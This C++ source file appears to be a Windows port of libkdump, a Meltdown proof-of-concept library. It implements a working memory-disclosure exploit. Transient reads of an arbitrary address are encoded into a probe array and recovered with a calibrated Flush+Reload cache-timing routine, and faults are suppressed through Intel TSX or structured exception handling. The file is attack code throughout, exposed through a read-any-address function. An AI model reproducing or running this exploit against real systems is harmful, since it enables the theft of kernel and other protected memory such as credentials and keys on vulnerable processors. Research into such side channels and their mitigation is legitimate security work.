#include "stdafx.h"

#include "libkdump.hpp"

#include <xmmintrin.h>
#include <intrin.h>

#define STRICT
#define NOMINMAX

#include <sdkddkver.h>
#include <Windows.h>

// seriously...
#if defined(ERROR)
#undef ERROR
#endif

#include <vector>
#include <thread>
#include <atomic>

#include <gsl/gsl>

namespace kdump {
	config_t libkdump_auto_config = { 0 };

	static std::byte* mem = nullptr;
	static std::vector<std::thread> load_threads;
	static std::atomic<std::size_t> end_threads;
	static size_t phys = 0;
	static debug_level_t dbg = NONE;

	constexpr std::size_t probe_count = 0x100;
	constexpr std::size_t page_size = 0x1000;

	static config_t config;

	static __forceinline void meltdown_nonull(void) {
		uint64_t byte;

	retry:
		byte = *(volatile uint8_t*)phys;
		byte *= page_size;
		if(byte == 0) goto retry;

		*(volatile uint64_t*)(mem + byte);
	}

	static __forceinline void meltdown_fast(void) {
		uint64_t byte;

		byte = *(volatile uint8_t*)phys;
		byte *= page_size;
		*(volatile uint64_t*)(mem + byte);
	}

	static __forceinline void meltdown(void) {
		uint64_t byte;

	retry:
		*(volatile uint64_t*)0;

		byte = *(volatile uint8_t*)phys;
		byte *= page_size;
		if(byte == 0) goto retry;

		*(volatile uint64_t*)(mem + byte);
	}

#ifndef MELTDOWN
#define MELTDOWN meltdown_nonull()
#endif

	static void debug(debug_level_t level, const char *fmt, ...) {
		if(level > dbg) {
			return;
		}
		switch(level) {
		case NONE:
			return;
		case ERROR:
			printf("\x1b[31;1m[-]\x1b[0m ");
			break;
		case INFO:
			printf("\x1b[33;1m[.]\x1b[0m ");
			break;
		case SUCCESS:
			printf("\x1b[32;1m[+]\x1b[0m ");
			break;
		default:
			break;
		}
		va_list ap;
		va_start(ap, fmt);
		vfprintf(stdout, fmt, ap);
		va_end(ap);
	}

	static __forceinline void maccess(void *p) {
		*(volatile size_t*)p;
	}

	static __forceinline int flush_reload(void *ptr) {
		uint64_t start = 0, end = 0;
		uint32_t discard;

		_mm_lfence();
		start = __rdtsc();
		maccess(ptr);
		end = __rdtscp(&discard);
		_mm_lfence();
		_mm_clflush(ptr);

		if(end - start < config.cache_miss_threshold) {
			return 1;
		}
		return 0;
	}

	static void nopthread() {
		while(!end_threads) {
			_mm_pause();
		}
	}

	static void syncthread() {
		HANDLE volume = ::CreateFileW(L"\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		auto f = gsl::finally([=]() {
			::CloseHandle(volume);
		});

		while(!end_threads) {
			::FlushFileBuffers(volume);
		}
	}

	static void yieldthread() {
		while(!end_threads) {
			SwitchToThread();
		}
	}

	enum cpuid : int32_t
	{
		basic_info = 0x0000'0000i32,
		extended_features = 0x0000'0007i32,
		extended_limit = 0x8000'0000i32,
		brand_string_0 = 0x8000'0002i32,
		brand_string_1 = 0x8000'0003i32,
		brand_string_2 = 0x8000'0004i32,
		advanced_power_management = 0x8000'0007i32,
		amd_secure_memory_encryption = 0x8000'001fi32,
	};

	enum regs : int8_t
	{
		eax,
		ebx,
		ecx,
		edx
	};

	static bool check_tsx() {
		std::array<int, 4> cpu = { 0 };
		__cpuidex(cpu.data(), cpuid::basic_info, 0x0);
		if(cpu[regs::eax] < cpuid::extended_features) {
			return false;
		}
		std::array<int32_t, 4> registers = { 0 };
		__cpuidex(registers.data(), cpuid::extended_features, 0x0);
		if((1ui32 << 11ui32) == (registers[regs::ebx] & (1ui32 << 11ui32))) {
			return true;
		}
		return false;
	}

	static void detect_fault_handling() {
		if(check_tsx()) {
			debug(SUCCESS, "Using Intel TSX\n");
			config.fault_handling = TSX;
		} else {
			debug(INFO, "No Intel TSX, fallback to SEH\n");
			config.fault_handling = SEH;
		}
	}

	static void detect_flush_reload_threshold() {
		size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
		size_t dummy[16];
		size_t *ptr = dummy + 8;
		uint64_t start = 0, end = 0;
		uint32_t discard;

		maccess(ptr);
		for(std::size_t i = 0; i < count; i++) {
			_mm_lfence();
			start = __rdtsc();
			maccess(ptr);
			end = __rdtscp(&discard);
			_mm_lfence();
			reload_time += (end - start);
		}
		for(std::size_t i = 0; i < count; i++) {
			_mm_clflush(ptr);
			_mm_lfence();
			start = __rdtsc();
			maccess(ptr);
			end = __rdtscp(&discard);
			_mm_lfence();
			flush_reload_time += (end - start);
		}
		reload_time /= count;
		flush_reload_time /= count;

		debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n", flush_reload_time, reload_time);
		config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
		debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n", config.cache_miss_threshold);
	}

	static void set_auto_config() {
		debug(INFO, "Auto configuration\n");
		detect_fault_handling();
		detect_flush_reload_threshold();
		config.measurements = 3;
		config.accept_after = 1;
		config.load_threads = 1;
		config.load_type = NOP;
		config.retries = 10000;
	}

	static bool check_config() {
		if(config.cache_miss_threshold <= 0) {
			detect_flush_reload_threshold();
		}
		if(config.cache_miss_threshold <= 0) {
			return false;
		}
		return true;
	}

	config_t libkdump_get_autoconfig() {
		set_auto_config();
		return config;
	}

	bool libkdump_init(const config_t configuration) {
		config = configuration;
		if(memcmp(&config, &libkdump_auto_config, sizeof(config_t)) == 0) {
			set_auto_config();
		}

		if(!check_config()) {
			return false;
		}

		mem = static_cast<std::byte*>(::VirtualAlloc(nullptr, page_size * probe_count, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
		if(!mem) {
			return false;
		}
		std::memset(mem, 0xab, page_size * probe_count);

		for(std::size_t i = 0; i < probe_count; i++) {
			_mm_clflush(mem + i * page_size);
		}
		using thread_type = void(*)();
		thread_type thread_func = nullptr;
		switch(config.load_type) {
		case IO:
			thread_func = syncthread;
			break;
		case YIELD:
			thread_func = yieldthread;
			break;
		case NOP:
		default:
			thread_func = nopthread;
		}

		for(std::size_t i = 0; i < config.load_threads; ++i) {
			load_threads.emplace_back(thread_func);
		}

		debug(SUCCESS, "Started %d load threads\n", config.load_threads);
		debug(SUCCESS, "libkdump initialized\n");
		return true;
	}

	int libkdump_cleanup() {
		end_threads = 1;
		for(std::size_t i = 0; i < config.load_threads; i++) {
			load_threads[i].join();
		}
		::VirtualFree(mem, 0, MEM_RELEASE);
		debug(SUCCESS, "Everything is cleaned up, good bye!\n");
		return 0;
	}

	void libkdump_enable_debug(debug_level_t level) {
		dbg = level;
	}

	static std::size_t __forceinline read_value() {
		std::size_t hit = 0;
		for(std::size_t i = 0; i < probe_count; i++) {
			if(flush_reload(mem + i * page_size)) {
				hit = i + 1;
			}
		}
		return hit - 1;
	}

	std::size_t read_tsx() {
		std::size_t retries = config.retries + 1;

		while(retries--) {
			if(_xbegin() == _XBEGIN_STARTED) {
				MELTDOWN;
				_xend();
			}
			for(std::size_t i = 0; i < probe_count; i++) {
				if(flush_reload(mem + i * page_size)) {
					if(i >= 1) {
						return i;
					}
				}
			}
		}
		return 0;
	}

	std::size_t read_seh() {
		std::size_t retries = config.retries + 1;

		while(retries--) {
			__try {
				MELTDOWN;
			} __except(EXCEPTION_EXECUTE_HANDLER) {
				;
			}

			for(std::size_t i = 0; i < probe_count; i++) {
				if(flush_reload(mem + i * page_size)) {
					if(i >= 1) {
						return i;
					}
				}
			}
		}
		return 0;
	}

	std::array<std::byte, 1> libkdump_read(size_t addr) {
		phys = addr;

		std::uint8_t res_stat[probe_count];
		std::memset(&res_stat[0], 0, probe_count);

		for(std::size_t i = 0; i < config.measurements; i++) {
			const std::size_t r = config.fault_handling == TSX ? read_tsx()
			                                                   : read_seh();
			res_stat[r]++;
		}
		std::size_t max_v = 0;
		std::byte max_i{ 0 };

		if(dbg) {
			for(int i = 0; i < sizeof(res_stat); i++) {
				if(res_stat[i] != 0) {
					debug(INFO, "res_stat[%x] = %d\n", i, res_stat[i]);
				}
			}
		}

		for(std::size_t i = 1; i < probe_count; ++i) {
			if(res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
				max_v = res_stat[i];
				max_i = static_cast<std::byte>(i);
			}
		}
		return { max_i };
	}

}
